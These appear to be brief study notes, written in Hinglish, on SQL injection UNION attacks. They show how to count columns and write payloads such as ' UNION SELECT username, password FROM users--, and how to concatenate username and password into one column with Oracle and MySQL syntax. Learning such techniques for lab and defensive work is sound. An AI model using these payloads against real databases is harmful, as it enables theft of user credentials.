#Retrieving multiple values within a single column
Column & type identify karna

Pehle original query ke columns count karo.
Check karo kaunse columns string le sakte hain.

Basic UNION attack

Agar table users hai aur columns username & password:
' UNION SELECT username, password FROM users--
Injection quoted string ke andar use hota hai.

Single column me multiple values

Agar query sirf 1 column return kare:
Oracle: username || '~' || password
MySQL: CONCAT(username, '~', password)
Separator (~) se values distinguish hoti hain.
Example: ' UNION SELECT username || '~' || password FROM users--


